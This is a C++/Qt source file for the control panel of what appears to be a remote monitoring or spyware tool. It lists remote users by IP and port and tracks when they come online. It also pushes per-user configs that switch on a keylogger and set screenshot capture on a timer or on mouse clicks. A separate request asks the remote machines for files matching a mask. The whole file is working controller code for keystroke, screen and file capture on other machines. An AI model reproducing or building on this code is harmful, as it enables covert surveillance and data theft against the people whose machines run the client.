#include "server.h"
#include "ui_server.h"

#include "QDebug"

//https://www.iconfinder.com/icons/46254/active_approval_online_status_icon#size=16
//https://www.iconfinder.com/icons/46252/busy_offline_status_icon#size=16

Server::Server(QWidget *parent, const QString& defaultPath, quint16 port_) :
    QMainWindow{parent},
    path{defaultPath},
    localPort{port_},
    ui{std::make_unique<Ui::Server>()},
    uiMapper{std::make_unique<QDataWidgetMapper>(this)},
    fileServer{std::make_unique<FileServer>(this, port_, path + "/users")},
    fileClient{std::make_unique<FileClient>(this, "127.0.0.1", 1234)}
{
    ui->setupUi(this);
    ui->buttonFileDialog->setEnabled(false);
    ui->buttonSaveConfig->setEnabled(false);
    ui->buttonSendConfig->setEnabled(false);
    //Screenshot
    ui->spinSeconds->setEnabled(false);
    ui->checkLMB->setEnabled(false);
    ui->checkRMB->setEnabled(false);
    ui->checkMMB->setEnabled(false);
    ui->checkMWH->setEnabled(false);
    //Keylogger
    ui->checkOnOff->setEnabled(false);
    ui->spinSeconds2->setEnabled(false);

    loadUsers();

    //Setup model
    setupModels();
    ui->treeUsers->setModel(treeModel.get());

    //Setup mapper
    uiMapper->setModel(treeModel.get());
    uiMapper->addMapping(ui->spinSeconds, 3, "value");
    uiMapper->addMapping(ui->checkLMB, 4);
    uiMapper->addMapping(ui->checkRMB, 5);
    uiMapper->addMapping(ui->checkMMB, 6);
    uiMapper->addMapping(ui->checkMWH, 7);
    uiMapper->addMapping(ui->checkOnOff, 8);
    uiMapper->addMapping(ui->spinSeconds2, 9);

    //Hide model items in tree view
    for (int i=3; i<=9; ++i)
        ui->treeUsers->setColumnHidden(i, true);

    connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
            [this](const QModelIndex& current, const QModelIndex&  /* previous */ ) {
                uiMapper->setCurrentIndex(current.row());
                ui->buttonFileDialog->setEnabled(true);
                ui->buttonSaveConfig->setEnabled(true);
                ui->buttonSendConfig->setEnabled(true);
                ui->spinSeconds->setEnabled(true);
                ui->checkLMB->setEnabled(true);
                ui->checkRMB->setEnabled(true);
                ui->checkMMB->setEnabled(true);
                ui->checkMWH->setEnabled(true);
                ui->checkOnOff->setEnabled(true);
                ui->spinSeconds2->setEnabled(true);
                //Disconnect after first time
                disconnect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged, 0, 0);
    });


    QDir configDir;
    configDir.mkpath(path + "/configs");

    //Start modules
    fileServer->start();
    connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip) { this->getString(str, ip); });

    //Send config
    connect(fileClient.get(), &FileClient::transmitted, [this]()
    {
        QString cfg = path + "/configs/" + fileClient->getIp();
        QFile oldCfgFile(cfg + ".cfg");
        //Remove old config
        if (oldCfgFile.exists())
            oldCfgFile.remove();
        //Rename new config to ".cfg"
        QFile tempCfgFile(cfg + "_temp.cfg");
        tempCfgFile.rename(cfg + ".cfg");

        //disconnect after file transfer

        //TODO ???
//            const FileClient* ptr = fileClient.get();
//            disconnect(ptr, &FileClient::transmitted, 0, 0);
    });

    //Connect buttons clicks
    connect(ui->buttonSendConfig, &QPushButton::clicked, this, &Server::configSendClicked);
    connect(ui->buttonSaveConfig, &QPushButton::clicked, this, &Server::configSaveClicked);
    connect(ui->buttonFileDialog, &QPushButton::clicked, this, &Server::fileDialogClicked);
}

Server::~Server()
{
    saveUsers();
}

void Server::setupModels()
{
    treeModel = std::make_unique<QStandardItemModel>(this);
    treeModel->setColumnCount(10);

    //Set header names
    treeModel->setHeaderData(0, Qt::Horizontal, "username");
    treeModel->setHeaderData(1, Qt::Horizontal, "ip");
    treeModel->setHeaderData(2, Qt::Horizontal, "port");
    treeModel->setHeaderData(3, Qt::Horizontal, "secondsScreen");
    treeModel->setHeaderData(4, Qt::Horizontal, "LMB");
    treeModel->setHeaderData(5, Qt::Horizontal, "RMB");
    treeModel->setHeaderData(6, Qt::Horizontal, "MMB");
    treeModel->setHeaderData(7, Qt::Horizontal, "MWH");
    treeModel->setHeaderData(8, Qt::Horizontal, "isLogWorking");
    treeModel->setHeaderData(9, Qt::Horizontal, "SecondLog");

    //Traverse existing users and add to model
    QList<QStandardItem*> items;
    QHash<QString, QPair<QString, quint16>>::iterator iter = usernames.begin();
    Config* cfg;
    QString ip;
    QString username;
    quint16 port;
    while (iter != usernames.end())
    {
        ip = iter.key();
        username = iter.value().first;
        port = iter.value().second;

        //load configs
        if (usersConfig.contains(ip))
            cfg = usersConfig.value(ip);
        else
        {
            cfg = new Config();
            usersConfig.insert(ip, cfg);
            if (!loadConfig(*cfg, path + "/configs/" + ip + ".cfg"))
                saveConfig(*cfg, path + "/configs/" + ip + ".cfg");
        }

        initTreeModel(items, ip, username, port, cfg, OFFLINE);
        ++iter;
    }
}

void Server::initTreeModel(QList<QStandardItem*>& items,
                           const QString& ip,
                           const QString& username,
                           const quint16 port,
                           const Config* cfg,
                           const state& st)
{
    //Create items and write to model
    QStandardItem* ipItem = new QStandardItem(ip);
    QStandardItem* nameItem = new QStandardItem(QIcon(st ? ":/icons/online.png" : ":/icons/offline.png"), username);
    QStandardItem* portItem = new QStandardItem( QString::number(port) );

    //Set not editable item
    ipItem->setFlags(ipItem->flags() & ~Qt::ItemIsEditable);
    nameItem->setFlags(nameItem->flags() & ~Qt::ItemIsEditable);
    portItem->setFlags(portItem->flags() & ~Qt::ItemIsEditable);

    QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->secondsScreen));
    QStandardItem* LMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::left)] ? "1" : "0"));
    QStandardItem* RMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::right)] ? "1" : "0"));
    QStandardItem* MMB = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::middle)] ? "1" : "0"));
    QStandardItem* MWH = new QStandardItem(QString(cfg->mouseButtons[int(Buttons::wheel)] ? "1" : "0"));
    QStandardItem* secondsLogItem = new QStandardItem(QString::number(cfg->secondsLog));
    QStandardItem* logRunItem = new QStandardItem(cfg->logRun ? "1" : "0");

    items << nameItem << ipItem << portItem << secondsItem << LMB << RMB << MMB << MWH << logRunItem << secondsLogItem;
    treeModel->appendRow(items);
    items.clear();
}

bool Server::saveUsers()
{
    QFile usersFile(path + "/list.usr");
    if ( !usersFile.open(QIODevice::WriteOnly) )
        return false;
    QDataStream users(&usersFile);
    users << usernames;
    usersFile.close();
    return true;
}

bool Server::loadUsers()
{
    QFile usersFile(path + "/list.usr");
    if ( usersFile.exists() )
    {
        if ( !usersFile.open(QIODevice::ReadOnly) )
            return false;
        QDataStream users(&usersFile);
        users >> usernames;
        usersFile.close();
        //Check all configs in folder by user's ip
        QDirIterator iter(path + "/configs", QStringList() << "*.cfg", QDir::Files);
        QString ip;
        while (iter.hasNext())
        {
            iter.next();
            ip = iter.fileName().section(".", 0, -2);
            //If user already exists => load config to memory
            if (usernames.contains(ip))
            {
                Config* config = new Config;
                loadConfig(*config, path + "/configs/" + ip + ".cfg");
                usersConfig.insert(ip, config);
            }
        }
        return true;
    }
    else
        return false;
}


void Server::getString(const QString str, const QString ip)
{
    //Parse string
    QString command = str.section('|', 0, 0);
    //If user online
    if (command == "ONLINE")
    {
        QString username = str.section("|", 1, 1);
        quint16 port = str.section("|", 2, 2).toInt();
        //If QHash doesn't contain new user's ip
        if ( ! usernames.contains(ip) )
        {
            QString cfgPath = path + "/configs/" + ip + ".cfg";
            Config* config = new Config;
            //If config doesn't exist
            if( ! loadConfig(*config, cfgPath) )
            {
                qDebug() << "Config not found. Creating new.";
                saveConfig(*config, cfgPath);
            }
            QPair <QString, quint16> pair (username, port);
            usernames.insert(ip, pair);
            usersConfig.insert(ip, config);

            //Add new user to tree model
            QList<QStandardItem*> items;
            initTreeModel(items, ip, username, port, config, ONLINE);
        }
        else
        {
            QList<QStandardItem*> items;
            items = treeModel->findItems(username, Qt::MatchFixedString, 0);
            if (items.size() == 1)
            {
                //Change icon and port
                items.at(0)->setIcon(QIcon(":/icons/online.png"));
                QModelIndex index = treeModel->index(items.at(0)->row(), 2);
                treeModel->setData(index, port);
            }
            else
            {
                //User have the same ip
                QPair <QString, quint16> pair (username, port);
                usernames[ip] = pair;
                //Change icon, username and port
                items = treeModel->findItems(ip, Qt::MatchFixedString, 1);
                treeModel->item(items.at(0)->row(), 0)->setIcon(QIcon(":/icons/online.png"));
                QModelIndex index = treeModel->index(items.at(0)->row(), 0);
                treeModel->setData(index, username);
                index = treeModel->index(items.at(0)->row(), 2);
                treeModel->setData(index, port);
            }
        }
    }
    else if (command == "OFFLINE")
    {
        QString username = str.section("|", -1, -1);
        quint16 port = str.section("|", 2, 2).toInt();
        QList<QStandardItem*> items;
        items = treeModel->findItems(username, Qt::MatchFixedString, 0);
        if (items.size() == 1)
            items.at(0)->setIcon(QIcon(":/icons/offline.png"));
        else
        {
            //User have the same ip
            QPair <QString, quint16> pair (username, port);
            usernames[ip] = pair;
            //Change icon, username and port
            items = treeModel->findItems(ip, Qt::MatchFixedString, 0);
            items.at(0)->setIcon(QIcon(":/icons/offline.png"));
            QModelIndex index = treeModel->index(items.at(0)->row(), 0);
            treeModel->setData(index, username);
            index = treeModel->index(items.at(0)->row(), 2);
            treeModel->setData(index, port);
        }
    }
}

void Server::setConfig(Config &cfg)
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        int currentRow = ui->treeUsers->currentIndex().row();
        cfg.bindEnter = false;
        QString buttons("");
        //Reverse order: buttons = "lmb_rmb_mmb_wheel"
        buttons += treeModel->index(currentRow, 7).data().toBool() ? '1' : '0';
        buttons += treeModel->index(currentRow, 6).data().toBool() ? '1' : '0';
        buttons += treeModel->index(currentRow, 5).data().toBool() ? '1' : '0';
        buttons += treeModel->index(currentRow, 4).data().toBool() ? '1' : '0';
        //Screenshot
        cfg.mouseButtons = std::bitset<int(Buttons::count)>(buttons.toStdString());
        cfg.secondsScreen = treeModel->index(currentRow, 3).data().toInt();
        //Keylogger
        cfg.logRun = treeModel->index(currentRow, 8).data().toBool();
        cfg.secondsLog = treeModel->index(currentRow, 9).data().toInt();
    }
}

void Server::configSendClicked()
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QModelIndex portIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 2);
        QString ip = ipIndex.data().toString();
        quint16 port = portIndex.data().toInt();
        //QString cfgPath = path + "/configs/" + ip + ".cfg";
        QString tempCfgPath = path + "/configs/" + ip + "_temp.cfg";
        //QFile oldCfgFile(cfgPath);
        //QFile tempCfgFile(tempCfgPath);
        Config* cfg = usersConfig.value(ip);

        setConfig(*cfg);
        fileClient->changePeer(ip, port);

        //Save temp config
        saveConfig(*cfg, tempCfgPath);

        connect(fileClient.get(), &FileClient::error, [this](QAbstractSocket::SocketError socketError)
        {
            qDebug() << "Config not sent" << socketError;
            QString cfg = path + "/configs/" + fileClient->getIp();
            QFile tempCfgFile(cfg + "_temp.cfg");
            tempCfgFile.remove();
            disconnect(fileClient.get(), &FileClient::error, 0, 0);
        });

        //Send config
        fileClient->enqueueData(_FILE, tempCfgPath);
        fileClient->connect();
    }
}

void Server::configSaveClicked()
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QString ip = ipIndex.data().toString();

        QString cfgPath = path + "/configs/" + ip + ".cfg";
        Config* cfg = usersConfig.value(ip);

        setConfig(*cfg);
        saveConfig(*cfg, cfgPath);
    }
}

void Server::fileDialogClicked()
{
    fileDialog = std::make_unique<FileDialog>(this);
    //fileDialog->setAttribute(Qt::WA_DeleteOnClose, true);
    fileDialog->show();

    //Connect "accepted" and "rejected"
    connect(fileDialog.get(), &FileDialog::accepted, this, &Server::fileDialogAccepted);
//    connect(fileDialog.get(), &FileDialog::rejected, fileDialog.get(), &FileDialog::deleteLater);
}

void Server::fileDialogAccepted()
{
    QString mask = QString::number(fileDialog->getFileMask());
    //TODO del

//    QString string = fileDialog->getFileString();

    //If no parameters set or user isn't selected
    if ( (mask == "0" /* && string.isEmpty() */ ) || ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QModelIndex portIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 2);
        QString ip = ipIndex.data().toString();
        quint16 port = portIndex.data().toInt();
        fileClient->changePeer(ip, port);

        //Send string
        fileClient->enqueueData(_STRING, "FILES|" + mask /* + '|' + string */);
        fileClient->connect();
    }
}
